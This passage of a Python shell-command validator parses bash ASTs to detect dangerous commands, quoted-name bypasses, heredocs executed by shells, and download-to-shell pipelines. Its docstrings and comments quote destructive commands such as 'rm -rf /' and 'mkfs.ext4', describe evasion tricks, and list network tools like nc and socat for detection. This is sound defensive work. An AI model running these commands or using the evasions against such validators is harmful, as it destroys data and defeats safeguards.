        """Reconstruct command from AST word nodes.

        No production caller - the live validation pass uses
        reconstruct_command_with_suppression_ranges, which produces the same
        string plus the ranges the rule engine needs. Kept for the
        native-parser differential oracle; harden the other one.

        Args:
            ast_nodes: List of bashlex AST nodes from parse()

        Returns:
            Reconstructed command string with escapes resolved

        Example:
            >>> parser = BashCommandParser()
            >>> ast = parser.parse("rm\\\\ -rf\\\\ /")
            >>> parser.reconstruct_command(ast)
            'rm -rf /'
        """
        return " ".join(word for word, _ in self._collect_words(ast_nodes))

    def reconstruct_command_with_suppression_ranges(self, command: str, ast_nodes: list[Any]) -> tuple[str, list[tuple]]:
        """Reconstruct the command AND rebase its suppression ranges onto it.

        SECURITY CRITICAL (LAB-1732): the reconstructed pass is the only defence
        that catches a dangerous command whose name is quoted - bash runs
        `"chmod" 777 /etc/shadow` exactly as `chmod 777 /etc/shadow`. That pass
        used to be skipped whenever the command held any quoted token at all,
        because reconstruction strips quote characters and so invalidates every
        offset computed against the original string. Skipping traded a
        false-positive class for an under-block class, the wrong direction for a
        fail-closed validator. Rebasing keeps both properties: the pass always
        runs, and matches living wholly inside quoted data stay suppressed.

        Rebasing works because suppression needs a match to sit ENTIRELY inside
        one range (RuleEngine._is_in_string_literal). Which words earn a range
        is decided by _quoting_is_load_bearing - read that first.

        Args:
            command: Original command string (needed for quote detection)
            ast_nodes: List of bashlex AST nodes from parse()

        Returns:
            (reconstructed_command, suppression_ranges).

            NOT the same shape as extract_string_literals, though both feed the
            same `string_literals=` argument, so passing one where the other
            belongs misaligns suppression silently. These offsets index the
            RECONSTRUCTED string, cover the whole word plus its joining space,
            and are omitted entirely for words whose quotes do no work.

        Example:
            >>> parser = BashCommandParser()
            >>> ast = parser.parse('echo "rm -rf /"')
            >>> parser.reconstruct_command_with_suppression_ranges('echo "rm -rf /"', ast)
            ('echo rm -rf /', [(5, 14)])
        """
        words = self._collect_words(ast_nodes)
        ranges = []
        offset = 0

        for word, span in words:
            if span is not None and self._quoting_is_load_bearing(command, word, span):
                # Absorb the following joining space. In the source that offset
                # held the closing quote, a character no rule pattern can cross;
                # reconstruction turns it into whitespace, which patterns ending
                # in `(\s|$)` will happily consume - without this the match ends
                # one character past the range and escapes suppression. Adding it
                # unconditionally is safe: for the final word the range then ends
                # at len(reconstructed) + 1, which no match end can reach.
                ranges.append((offset, offset + len(word) + 1))
            offset += len(word) + 1  # +1 for the joining space

        return " ".join(word for word, _ in words), ranges

    def _quoting_is_load_bearing(self, command: str, word: str, span: tuple) -> bool:
        """Whether a word's quotes do real work, rather than just hiding it.

        SECURITY CRITICAL: this is the whole of LAB-1732. Quotes suppress a rule
        match only when they are what makes the text a single inert argument -
        `echo "rm -rf /"` passes one word to echo, and without the quotes it
        would not. A quoted BARE TOKEN is different: bash runs `"mkfs.ext4"`
        exactly as `mkfs.ext4`, so the quotes change nothing about execution and
        exist only to keep the name out of the reconstructed string. Suppressing
        there is the bypass, because a name-only pattern (`\bmkfs\b`) sits
        entirely inside that one word and so is swallowed whole.

        Asking "is the quoting load-bearing" rather than "is this the command
        name" is what covers the exec-wrapper forms - `timeout 5 "mkfs.ext4" …`,
        `env FOO=1 "mkfs.ext4" …`, `nice/command/nohup/setsid "mkfs.ext4" …` -
        where bash executes a word that is NOT in command-name position.
        """
        if not word or not self._is_quoted_span(command, span):
            return False
        # Shell-significant characters are the ones quoting actually protects.
        return any(char in word for char in " \t\n;|&<>()$`*?[]#~!\\'\"")

    @staticmethod
    def _is_quoted_span(command: str, span: tuple) -> bool:
        """Whether the source text at ``span`` is wrapped in matching quotes.

        Shared with extract_string_literals so both derive "is this token a
        quoted literal" from one rule.
        """
        start, end = span
        if start >= len(command) or end > len(command) or end - start < 2:
            return False
        return (command[start] == '"' and command[end - 1] == '"') or (command[start] == "'" and command[end - 1] == "'")

    def extract_heredoc_ranges(self, command: str, ast_nodes: list[Any]) -> list[tuple]:
        """Extract heredoc content ranges that should NOT be pattern matched.

        SECURITY: Heredoc content is only TEXT unless piped to a shell.
        'cat << EOF' outputs text, 'bash << EOF' executes it.

        Args:
            command: Original command string
            ast_nodes: List of bashlex AST nodes from parse()

        Returns:
            List of (start, end, is_shell) tuples for heredoc content ranges.
            is_shell=True means the heredoc will be executed by a shell.
        """
        heredoc_ranges = []

        def visit(node, parent_cmd=None):
            """Recursively visit AST nodes to find heredocs."""
            if hasattr(node, "kind"):
                # Track command name for determining if heredoc goes to shell
                cmd_name = None
                if node.kind == "command" and hasattr(node, "parts") and node.parts:
                    for part in node.parts:
                        if hasattr(part, "word"):
                            cmd_name = part.word.split("/")[-1]  # Handle /bin/bash
                            break

                # Check for redirect nodes with heredocs
                if node.kind == "redirect" and hasattr(node, "heredoc"):
                    heredoc = node.heredoc
                    if hasattr(heredoc, "pos"):
                        start, end = heredoc.pos
                        is_shell = parent_cmd in _HEREDOC_SHELL_COMMANDS if parent_cmd else False
                        heredoc_ranges.append((start, end, is_shell))

                # Recursively visit child nodes
                for attr in ["parts", "command", "list", "pipe", "compound"]:
                    if hasattr(node, attr):
                        child = getattr(node, attr)
                        if isinstance(child, list):
                            for item in child:
                                visit(item, cmd_name or parent_cmd)
                        elif child:
                            visit(child, cmd_name or parent_cmd)

        for node in ast_nodes or []:
            visit(node)

        return heredoc_ranges

    def extract_string_literals(self, command: str, ast_nodes: list[Any]) -> list[tuple]:
        """Extract quoted string literals from AST with their positions.

        This method identifies strings that won't be executed (quoted literals)
        vs strings that will be executed. Used to avoid false positives when
        dangerous patterns appear in documentation, commit messages, or echo statements.

        Args:
            command: Original command string (needed for position mapping)
            ast_nodes: List of bashlex AST nodes from parse()

        Returns:
            List of (start_pos, end_pos) tuples for each quoted string literal

        Example:
            >>> parser = BashCommandParser()
            >>> ast = parser.parse('echo "rm -rf /"')
            >>> literals = parser.extract_string_literals('echo "rm -rf /"', ast)
            >>> # literals = [(6, 14)]  # Position of content inside quotes
        """
        string_literals = []

        def visit(node):
            """Recursively visit AST nodes to find quoted strings."""
            if hasattr(node, "kind"):
                # Look for word nodes that are quoted strings
                if node.kind == "word" and hasattr(node, "pos"):
                    # Record the position INSIDE the quotes (exclude quote chars).
                    # _is_quoted_span's own `end - start < 2` check rules out the
                    # empty-quote span that would invert this range.
                    if self._is_quoted_span(command, node.pos):
                        string_literals.append((node.pos[0] + 1, node.pos[1] - 1))

                # Recursively visit child nodes
                for attr in ["parts", "command", "list", "pipe", "compound"]:
                    if hasattr(node, attr):
                        child = getattr(node, attr)
                        if isinstance(child, list):
                            for item in child:
                                visit(item)
                        elif child:
                            visit(child)

        for node in ast_nodes or []:
            visit(node)

        return string_literals

    def has_dangerous_constructs(self, ast_nodes: list[Any]) -> list[str]:
        """Detect dangerous shell constructs in AST.

        Checks for constructs that enable arbitrary code execution:
        - eval/exec commands
        - Remote code execution via curl/wget piped to shell

        Note: Command substitution $(cmd) and process substitution <(cmd) are
        NOT flagged here. They are handled by SubstitutionValidator which uses:
        1. Whitelist of safe commands (op, date, git, pwd, etc.)
        2. AST structural checks for bypass patterns (brace expansion, variables)
        3. Recursive validation with depth limit
        This prevents false positives on 1Password CLI while blocking attacks.

        Args:
            ast_nodes: List of bashlex AST nodes from parse()

        Returns:
            List of warning messages for detected dangerous constructs

        Example:
            >>> parser = BashCommandParser()
            >>> ast = parser.parse("eval dangerous")
            >>> parser.has_dangerous_constructs(ast)
            ['eval command detected']
        """
        dangers = []

        # Check for dangerous pipelines (curl | sh patterns)
        pipeline_dangers = self._detect_dangerous_pipelines(ast_nodes)
        dangers.extend(pipeline_dangers)

        def _get_all_words(node) -> list[str]:
            """Get ALL words from a command node, skipping assignments/redirects."""
            words = []
            if not hasattr(node, "parts"):
                return words
            for part in node.parts:
                # Skip assignment and redirect prefixes
                if hasattr(part, "kind") and part.kind in ("assignment", "redirect"):
                    continue
                if hasattr(part, "word"):
                    cmd = part.word.split("/")[-1]
                    if cmd:  # Skip empty strings
                        words.append(cmd)
            return words

        def visit_children(node, visitor):
            """Recursively visit child nodes of an AST node."""
            for attr in ("parts", "command", "list", "pipe", "compound"):
                if hasattr(node, attr):
                    child = getattr(node, attr)
                    if isinstance(child, list):
                        for item in child:
                            visitor(item)
                    elif child:
                        visitor(child)

        def visit(node):
            """Recursively visit AST nodes to detect dangerous patterns."""
            if hasattr(node, "kind"):
                # Detect eval/exec as COMMAND NAME only (not arguments)
                # SECURITY: kubectl exec, docker exec use "exec" as argument
                # We must NOT flag those - they're container tools, not shell exec.
                if node.kind == "command":
                    cmd_name = self._get_command_name(node)

                    # Direct eval/exec invocation
                    # EXCEPTION: exec used for FD operations is SAFE
                    # - exec 3>&1 (duplicate FD) - just redirects, no execution
                    # - exec >logfile (redirect stdout) - just redirects
                    # - exec bash (replace process) - DANGEROUS
                    if cmd_name == "exec":
                        words = _get_all_words(node)
                        # If exec has no arguments after it, or only redirects remain
                        # in parts, it's FD manipulation, not process replacement
                        if len(words) <= 1:
                            # Just "exec" with redirects - FD manipulation, safe
                            pass
                        else:
                            # exec followed by words - process replacement, dangerous
                            dangers.append("exec command detected")
                    elif cmd_name == "eval":
                        dangers.append("eval command detected")

                    # Wrapper bypass detection: env exec bash, command exec bash, etc.
                    # SECURITY: Wrappers modify execution context but pass through
                    # Scan all words looking for exec/eval as a command (not as arg to another tool)
                    # Allow: sudo kubectl exec (kubectl handles exec as subcommand)
                    # Block: sudo exec bash (exec IS the command)
                    elif cmd_name in WRAPPER_COMMANDS:
                        words = _get_all_words(node)
                        # Container tools that use "exec" as a subcommand (not shell exec)
                        container_tools = {"kubectl", "docker", "podman", "nerdctl", "crictl", "ctr"}
                        # Scan for exec/eval, but skip if preceded by container tool
                        for word in words[1:]:
                            if word in container_tools:
                                break  # Container tool found, exec is its subcommand
                            if word in ("eval", "exec"):
                                # Found exec/eval before any container tool
                                dangers.append(f"wrapper command bypass: {cmd_name} {word}")
                                break

                # Recursively visit child nodes
                visit_children(node, visit)

        for node in ast_nodes or []:
            visit(node)

        return dangers

    def _detect_dangerous_pipelines(self, ast_nodes: list[Any]) -> list[str]:
        """Detect remote code execution patterns in pipelines via AST.

        SECURITY CRITICAL: Detects patterns like 'curl URL | sh' using AST analysis.
        This is immune to obfuscation techniques that defeat regex patterns:
        - Environment variable prefixes: curl ... | VAR=value sh
        - Redirections: curl ... | sh 2>&1
        - Arguments: curl ... | bash -c
        - Whitespace tricks

        The AST-based detection looks at the actual command structure:
        1. Find pipeline nodes
        2. Extract first command name (download tool?)
        3. Extract subsequent command names (shell interpreter?)

        Args:
            ast_nodes: List of bashlex AST nodes from parse()

        Returns:
            List of warning messages for detected dangerous pipeline patterns
        """
        dangers = []

        # Download tools that fetch remote content
        download_tools = {
            "curl",
            "wget",
            "fetch",
            "aria2c",
            "http",
            "lynx",
            "links",
            "elinks",
            "w3m",  # Text browsers with -dump
            "nc",
            "netcat",
            "ncat",
            "socat",  # Network tools
            "GET",
            "lwp-request",  # Perl LWP tools
            # Additional download vectors (FINDING-001)
            "ftp",
            "tftp",
            "sftp",  # FTP variants
            "scp",
            "rsync",  # Remote copy tools
            "git",
            "svn",
            "hg",  # VCS tools that can fetch remote content
        }

        # Shell interpreters that execute piped input. Reuse the module constant; the
        # download->shell check historically also treated env/xargs as interpreters, so extend
        # locally for THAT check only.
        shell_interpreters = STDIN_EXEC_INTERPRETERS | {"env", "xargs"}

        def _stage_args(part) -> list[str]:
            """Word-args AFTER the command name for a pipeline stage command node."""
            words = []
            seen_name = False
            for sub in getattr(part, "parts", []):
                if getattr(sub, "kind", None) in ("assignment", "redirect"):
                    continue
                if hasattr(sub, "word"):
                    if not seen_name:
                        seen_name = True  # first word is the command name
                        continue
                    words.append(sub.word)
            return words

        def check_pipeline(node):
            """Check a pipeline node for dangerous patterns."""
            if not hasattr(node, "parts"):
                return

            # Extract (command name, args) per command stage, in order.
            stages = []
            for part in node.parts:
                kind = getattr(part, "kind", None)
                # A subshell/group stage (`(bash)`, `{ bash; }`) receives the pipe on its first
                # inner command - classify by that command so a wrapped shell sink is not missed
                # (#97). Inner pipelines within the group are caught separately by the recursive walk.
                stage_node = part if kind == "command" else (_first_command_node(part) if kind == "compound" else None)
                if stage_node is not None:
                    cmd_name = self._get_command_name(stage_node)
                    if cmd_name:
                        # Resolve multicall wrappers (busybox/toybox) to their applet so the
                        # stage is classified by what actually runs (`busybox sh` -> `sh`).
                        stages.append(_resolve_multicall(cmd_name, _stage_args(stage_node)))

            if len(stages) < 2:
                return

            names = [s[0] for s in stages]

            # (1) Existing remote-code-execution pattern: download tool -> shell interpreter.
            first_cmd = names[0]
            if first_cmd in download_tools:
                for subsequent_cmd in names[1:]:
                    if subsequent_cmd in shell_interpreters:
                        dangers.append(f"remote code execution: {first_cmd} piped to {subsequent_cmd}")
                        break

            # (2) Generalized pipe-to-shell: ANY downstream stage that executes its stdin as a
            # program (no program-source arg) is RCE on the piped data, regardless of producer.
            for name, stage_args in stages[1:]:
                if name in STDIN_EXEC_INTERPRETERS and _reads_stdin_as_program(name, stage_args):
                    dangers.append(f"data piped into shell interpreter: {name}")
                    break

        def visit(node):
            """Recursively visit AST to find pipeline nodes."""
            if hasattr(node, "kind"):
                if node.kind == "pipeline":
                    check_pipeline(node)

                # Recurse into child nodes
                for attr in ["parts", "command", "list", "pipe", "compound"]:
                    if hasattr(node, attr):
                        child = getattr(node, attr)
                        if isinstance(child, list):
                            for item in child:
                                visit(item)
                        elif child:
                            visit(child)

        for node in ast_nodes or []:
            visit(node)

        return dangers
